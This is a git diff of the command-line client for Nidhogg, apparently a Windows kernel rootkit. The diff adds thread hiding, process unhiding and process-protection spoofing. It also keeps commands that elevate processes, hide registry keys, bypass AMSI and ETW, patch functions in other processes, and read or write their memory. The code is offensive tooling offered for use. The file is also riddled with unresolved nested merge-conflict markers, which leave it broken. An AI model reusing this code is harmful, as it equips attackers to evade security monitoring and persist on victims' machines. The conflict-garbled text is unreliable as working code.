@@ -9,6 +9,7 @@ enum class Options {
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 	Add, Remove, Clear, Hide, Elevate, Query
 =======
 	Add, Remove, Clear, Hide, Elevate
@@ -19,16 +20,19 @@ enum class Options {
 =======
 	Add, Remove, Clear, Hide, Unhide, Elevate, Query, Write, Read
 >>>>>>> afd6daf (Nidhogg v0.2)
+=======
+	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read
+>>>>>>> a20f2bb (Updated client)
 };
 
-int PrintUsage() {
+void PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
-	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query | spoof | unspoof] [pid | pid1 pid2...] [ppid to spoof]" << std::endl;
+	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
+	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
 	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
 	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
-	return 1;
 }
 
 int Error(int errorCode) {
@@ -121,7 +125,12 @@ int wmain(int argc, const wchar_t* argv[]) {
 	int success = NIDHOGG_INVALID_COMMAND;
 
 	if (argc < 3)
-		return PrintUsage();
+		return Error(NIDHOGG_INVALID_COMMAND);
+
+	HANDLE hNidhogg = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+	if (hNidhogg == INVALID_HANDLE_VALUE)
+		return Error(NIDHOGG_ERROR_CONNECT_DRIVER);
 
 	if (_wcsicmp(argv[1], L"patch") != 0 && _wcsicmp(argv[1], L"write") != 0 && _wcsicmp(argv[1], L"read") != 0) {
 		if (_wcsicmp(argv[2], L"add") == 0)
@@ -136,28 +145,34 @@ int wmain(int argc, const wchar_t* argv[]) {
 			option = Options::Unhide;
 		else if (_wcsicmp(argv[2], L"elevate") == 0)
 			option = Options::Elevate;
+		else if (_wcsicmp(argv[2], L"signature") == 0)
+			option = Options::Signature;
 		else if (_wcsicmp(argv[2], L"query") == 0)
 			option = Options::Query;
 		else {
 			std::cerr << "[ - ] Unknown option." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		switch (option) {
 		case Options::Add:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				success = NidhoggProcessProtect(_wtoi(argv[3]));
+				success = Nidhogg::ProcessUtils::NidhoggProcessProtect(hNidhogg, _wtoi(argv[3]));
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				success = Nidhogg::ProcessUtils::NidhoggThreadProtect(hNidhogg, _wtoi(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"file") == 0) {
-				success = NidhoggFileProtect(_wcsdup(argv[3]));
+				success = Nidhogg::FileUtils::NidhoggFileProtect(hNidhogg, _wcsdup(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
-					success = NidhoggRegistryProtectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
 				}
 				else {
-					success = NidhoggRegistryProtectKey(_wcsdup(argv[3]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
 			else {
@@ -168,17 +183,20 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Remove:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				success = NidhoggProcessUnprotect(_wtoi(argv[3]));
+				success = Nidhogg::ProcessUtils::NidhoggProcessUnprotect(hNidhogg, _wtoi(argv[3]));
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				success = Nidhogg::ProcessUtils::NidhoggThreadUnprotect(hNidhogg, _wtoi(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"file") == 0) {
-				success = NidhoggFileUnprotect(_wcsdup(argv[3]));
+				success = Nidhogg::FileUtils::NidhoggFileUnprotect(hNidhogg, _wcsdup(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
-					success = NidhoggRegistryUnprotectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
 				}
 				else {
-					success = NidhoggRegistryUnprotectKey(_wcsdup(argv[3]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
 			else {
@@ -189,12 +207,15 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Clear:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0)
-				success = NidhoggProcessClearAllProtection();
+				success = Nidhogg::ProcessUtils::NidhoggProcessClearAllProtection(hNidhogg);
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				success = Nidhogg::ProcessUtils::NidhoggThreadClearAllProtection(hNidhogg);
+			}
 			else if (_wcsicmp(argv[1], L"file") == 0) {
-				success = NidhoggFileClearAllProtection();
+				success = Nidhogg::FileUtils::NidhoggFileClearAllProtection(hNidhogg);
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
-				success = NidhoggRegistryClearAll();
+				success = Nidhogg::RegistryUtils::NidhoggRegistryClearAll(hNidhogg);
 			}
 			else {
 				success = NIDHOGG_INVALID_OPTION;
@@ -204,19 +225,20 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Hide:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				success = NidhoggProcessHide(_wtoi(argv[3]));
+				success = Nidhogg::ProcessUtils::NidhoggProcessHide(hNidhogg, _wtoi(argv[3]));
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				success = Nidhogg::ProcessUtils::NidhoggThreadHide(hNidhogg, _wtoi(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"file") == 0) {
-				std::cerr << "[ - ] Invalid option!" << std::endl;
-				PrintUsage();
-				return 1;
+				success = NIDHOGG_INVALID_OPTION;
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
-					success = NidhoggRegistryHideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryHideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
 				}
 				else {
-					success = NidhoggRegistryHideKey(_wcsdup(argv[3]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryHideKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
 			else {
@@ -227,21 +249,14 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Unhide:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				std::cerr << "[ ! ] TBA" << std::endl;
-				PrintUsage();
-				return 1;
-			}
-			else if (_wcsicmp(argv[1], L"file") == 0) {
-				std::cerr << "[ - ] Invalid option!" << std::endl;
-				PrintUsage();
-				return 1;
+				success = Nidhogg::ProcessUtils::NidhoggProcessUnhide(hNidhogg, _wtoi(argv[3]));
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
-					success = NidhoggRegistryUnhideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideValue(hNidhogg, _wcsdup(argv[3]), _wcsdup(argv[4]));
 				}
 				else {
-					success = NidhoggRegistryUnhideKey(_wcsdup(argv[3]));
+					success = Nidhogg::RegistryUtils::NidhoggRegistryUnhideKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
 			else {
@@ -252,7 +267,26 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Elevate:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				success = NidhoggProcessElevate(_wtoi(argv[3]));
+				success = Nidhogg::ProcessUtils::NidhoggProcessElevate(hNidhogg, _wtoi(argv[3]));
+			}
+			else {
+				success = NIDHOGG_INVALID_OPTION;
+			}
+			break;
+		}
+		case Options::Signature:
+		{
+			if (_wcsicmp(argv[1], L"process") == 0 && argc == 6) {
+				int signatureType = _wtoi(argv[4]);
+				int signatureSigner = _wtoi(argv[5]);
+				
+				if ((signatureType < PsProtectedTypeNone || signatureType > PsProtectedTypeProtected) ||
+					(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
+					success = NIDHOGG_INVALID_OPTION;
+					break;
+				}
+
+				success = Nidhogg::ProcessUtils::NidhoggProcessSetProtection(hNidhogg, _wtoi(argv[3]), signatureType, signatureSigner);
 			}
 			else {
 				success = NIDHOGG_INVALID_OPTION;
@@ -262,7 +296,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 		case Options::Query:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
-				std::vector result = NidhoggQueryProcesses();
+				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryProcesses(hNidhogg);
 
 				if (result[0] < 4) {
 					success = result[0];
@@ -274,9 +308,25 @@ int wmain(int argc, const wchar_t* argv[]) {
 				for (int i = 0; i < result.size(); i++) {
 					std::cout << "\t" << result[i] << std::endl;
 				}
+				break;
+			}
+			else if (_wcsicmp(argv[1], L"thread") == 0) {
+				std::vector result = Nidhogg::ProcessUtils::NidhoggQueryThreads(hNidhogg);
+
+				if (result[0] < 4) {
+					success = result[0];
+					break;
+				}
+
+				std::cout << "[ + ] Protected tids:" << std::endl;
+
+				for (int i = 0; i < result.size(); i++) {
+					std::cout << "\t" << result[i] << std::endl;
+				}
+				break;
 			}
 			else if (_wcsicmp(argv[1], L"file") == 0) {
-				std::vector result = NidhoggQueryFiles();
+				std::vector result = Nidhogg::FileUtils::NidhoggQueryFiles(hNidhogg);
 
 				if (std::isdigit(result[0][0])) {
 					success = std::stoi(result[0]);
@@ -288,15 +338,16 @@ int wmain(int argc, const wchar_t* argv[]) {
 				for (int i = 0; i < result.size(); i++) {
 					std::wcout << "\t" << result[i] << std::endl;
 				}
+				break;
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc != 4) {
-					PrintUsage();
-					return 1;
+					success = NIDHOGG_INVALID_OPTION;
+					goto CleanUp;
 				}
 
 				if (_wcsicmp(argv[3], L"value") == 0) {
-					auto [protectedValues, protectedKeys] = NidhoggRegistryQueryProtectedValues();
+					auto [protectedValues, protectedKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedValues(hNidhogg);
 
 					if (std::isdigit(protectedValues[0][0])) {
 						success = std::stoi(protectedValues[0]);
@@ -310,7 +361,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 						std::wcout << "\tValueName: " << protectedValues[i] << std::endl;
 					}
 
-					auto [hiddenValues, hiddenKeys] = NidhoggRegistryQueryHiddenValues();
+					auto [hiddenValues, hiddenKeys] = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenValues(hNidhogg);
 
 					if (std::isdigit(hiddenValues[0][0])) {
 						success = std::stoi(hiddenValues[0]);
@@ -323,10 +374,10 @@ int wmain(int argc, const wchar_t* argv[]) {
 						std::wcout << "\tKeyName: " << hiddenKeys[i] << std::endl;
 						std::wcout << "\tValueName: " << hiddenValues[i] << std::endl;
 					}
-
+					break;
 				}
 				else if (_wcsicmp(argv[3], L"key") == 0) {
-					std::vector result = NidhoggRegistryQueryProtectedKeys();
+					std::vector result = Nidhogg::RegistryUtils::NidhoggRegistryQueryProtectedKeys(hNidhogg);
 
 					if (std::isdigit(result[0][0])) {
 						success = std::stoi(result[0]);
@@ -339,7 +390,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 						std::wcout << "\t" << result[i] << std::endl;
 					}
 
-					result = NidhoggRegistryQueryHiddenKeys();
+					result = Nidhogg::RegistryUtils::NidhoggRegistryQueryHiddenKeys(hNidhogg);
 
 					if (std::isdigit(result[0][0])) {
 						success = std::stoi(result[0]);
@@ -351,15 +402,11 @@ int wmain(int argc, const wchar_t* argv[]) {
 					for (int i = 0; i < result.size(); i++) {
 						std::wcout << "\t" << result[i] << std::endl;
 					}
+					break;
 				}
 				else {
-					PrintUsage();
-					return 1;
+					success = NIDHOGG_INVALID_OPTION;
 				}
-			}
-
-			else if (_wcsicmp(argv[1], L"patch") == 0) {
-				// add logic.
 			}
 
 			else {
@@ -591,35 +638,45 @@ int wmain(int argc, const wchar_t* argv[]) {
 =======
 =======
 	else if (_wcsicmp(argv[1], L"patch") == 0) {
+<<<<<<< HEAD
 >>>>>>> afd6daf (Nidhogg v0.2)
 		if (argc != 6 && argc != 4)
 			return PrintUsage();
+=======
+		if (argc != 6 && argc != 4) {
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
+		}
+>>>>>>> a20f2bb (Updated client)
 
 		int pid = _wtoi(argv[2]);
 
 		if (pid == 0) {
 			std::cerr << "[ - ] Invalid PID." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		if (_wcsicmp(argv[3], L"amsi") == 0) {
-			success = NidhoggAmsiBypass(pid);
+			success = Nidhogg::ModuleUtils::NidhoggAmsiBypass(hNidhogg, pid);
 		}
 		else if (_wcsicmp(argv[3], L"etw") == 0) {
-			success = NidhoggETWBypass(pid);
+			success = Nidhogg::ModuleUtils::NidhoggETWBypass(hNidhogg, pid);
 		}
 		else {
 			std::wstring wFunctionName(argv[4]);
 			std::string functionName(wFunctionName.begin(), wFunctionName.end());
 			std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));
 
-			success = NidhoggPatchModule(pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
+			success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
 		}
 >>>>>>> da4b5b2 (Added patching to the usermode side)
 	}
 	else {
-		if (argc != 6)
-			return PrintUsage();
+		if (argc != 6) {
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
+		}
 		MODE mode;
 
 		if (_wcsicmp(argv[5], L"kernel") == 0)
@@ -628,34 +685,38 @@ int wmain(int argc, const wchar_t* argv[]) {
 			mode = MODE::UserMode;
 		else {
 			std::cerr << "[ - ] Invalid mode." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		int pid = _wtoi(argv[2]);
 
 		if (pid == 0) {
 			std::cerr << "[ - ] Invalid PID." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		int size = _wtoi(argv[4]);
 
 		if (size == 0) {
 			std::cerr << "[ - ] Invalid size." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		int remoteAddress = ConvertToInt(argv[3]);
 
 		if (remoteAddress == 0) {
 			std::cerr << "[ - ] Invalid address." << std::endl;
-			return PrintUsage();
+			success = NIDHOGG_INVALID_OPTION;
+			goto CleanUp;
 		}
 
 		if (_wcsicmp(argv[1], L"write") == 0)
-			success = NidhoggWriteData(pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+			success = Nidhogg::ModuleUtils::NidhoggWriteData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
 		else if (_wcsicmp(argv[1], L"read") == 0) {
-			auto data = NidhoggReadData(pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+			auto data = Nidhogg::ModuleUtils::NidhoggReadData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
 
 			if ((int)data < 5)
 				success = (int)data;
@@ -664,6 +725,8 @@ int wmain(int argc, const wchar_t* argv[]) {
 		}
 	}
 
+CleanUp:
+	CloseHandle(hNidhogg);
 
 	if (success != NIDHOGG_SUCCESS)
 		return Error(success);
